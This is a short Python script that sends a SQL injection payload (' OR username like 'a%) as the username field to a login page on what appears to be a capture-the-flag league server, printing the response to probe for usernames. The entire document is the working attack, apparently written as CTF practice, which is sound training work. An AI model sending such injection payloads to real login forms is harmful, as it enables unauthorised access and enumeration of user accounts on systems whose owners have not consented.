#!/usr/bin/env python3

import requests

u = "' OR username like 'a%"
p = "pass"
response = requests.post('http://ctf-league.osusec.org:8080/login.php', data={'username': u, 'password': p})
print(response.text)
